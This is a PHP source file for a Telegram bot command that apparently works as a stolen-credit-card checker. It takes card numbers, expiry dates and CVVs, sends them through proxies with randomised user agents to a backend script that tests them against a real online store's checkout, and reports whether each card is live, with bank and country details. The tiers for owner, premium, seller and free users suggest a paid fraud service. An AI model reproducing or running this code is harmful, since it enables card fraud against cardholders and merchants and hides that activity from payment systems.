<?php

include('rnd-ua.php');

$pChkU = $isAdmin ? "Owner" : (in_array($user['id'], $f_data['premiuns']) ? "Premiun" : "Free");
if(in_array($user['id'], $sellers)){
$pChkU = "Seller";
}

$proxy = "🇺🇸 - Live!";
$gate = "𝙊𝙗𝙞𝙩𝙤";

$retry = 0;
//CHK Gate1
if(cCmd($msg['text'], ['/ob', '/Ob', '/oB', '/OB', '!ob', '!Ob', '!oB', '!OB', '.ob', '.OB', '.oB', '.Ob']) && $isPremiun){
 $eMsg = explode(' ', $msg['text']);
 $cEMsg = count($eMsg);
 $cBin = cBin($eMsg[1]);
 $antiSpam = TRUE;
 include('accs-as.php');
 
if($cEMsg == 1){
output('sendMessage', [
'chat_id' => $chat['id'],
'text' => "𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ".$gate." ♻️\n𝙁𝙤𝙧𝙢𝙖𝙩 -» <code>/ob cc|month|year|cvc</code>",
'reply_to_message_id' => $msg['message_id']
]);
}
else{
$msgId_bot = output('sendMessage', [
'chat_id' => $chat['id'],
'text' => "𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩...",
'reply_to_message_id' => $msg['message_id']
])['result']['message_id'];

include('cc-analyzer.php');

if($cc == false || $month == false || $year == false || $cvv == false){
include('cc-errors.php');
}
else{
auto:
output('editMessageText', [
'chat_id' => $chat['id'],
'message_id' => $msgId_bot,
'text' => "𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩... -» <code>⚪️</code>"
]);
/*=====  site  ======*/
$site = "https://www.windsorstore.com/collections/accessories/products/disposable-petal-pasties-071010213001?variant=17617767923763";
/*=====  1REQ  ======*/
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxypro);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $up3); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_URL, "$hosting/auto/auto2.php?cc=$cc&month=$month&year=$year&cvv=$cvv&site=$site");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'user-agent: '.$rnd_ua.''
));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$r1 = curl_exec($ch);
$msg2 = capture($r1, '"msg":"','"');
$status1 = capture($r1, '"status1":"','"');
$time = substr(curl_getinfo($ch)['total_time'], 0, 4)."'s";

if(empty($r1)){
$retry++;
goto auto;
}
if($retry > 4){
$status = "Waos! ⛈";
$status1 = "Max Retry!";
}

output('editMessageText', [
'chat_id' => $chat['id'],
'message_id' => $msgId_bot,
'text' => "𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩... -» <code>✨</code>"
]);

$rChk = "
零 𝘾𝘾 -» <code>".$cc."|".$month."|".$year."|".$cvv."</code>
青 𝙎𝙩𝙖𝙩𝙪𝙨 -» <code>".$status1."</code>
白 𝙍𝙚𝙨𝙪𝙡𝙩 -» <code>".$msg2."</code>

朱 𝘽𝙞𝙣 -» <code>".$cBin['brand']."</code> - <code>".$cBin['type']."</code> - <code>".$cBin['level']."</code>
亥 𝘽𝙖𝙣𝙠 -» <code>".$cBin['bank']."</code>
空 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 -» <code>".$cBin['country_name']." ".$cBin['flag']." - ".$cBin['currency_symbol']." ".$cBin['currency']."</code>

南 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» ".$gate."
栗 𝙍𝙚𝙩𝙧𝙞𝙚𝙨 -»  <code>".$retry."</code>
北 𝙋𝙧𝙤𝙭𝙮 -» <code>".$proxy."</code>
三 𝙏𝙞𝙢𝙚 𝙎𝙥𝙚𝙣𝙩 -» <code>".$time."</code>
玉 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 -» <code>".$user['id']."</code> -» <code>".$pChkU."</code>";
}
}
}
output('editMessageText', [
'chat_id' => $chat['id'],
'message_id' => $msgId_bot,
'text' => $rChk
]);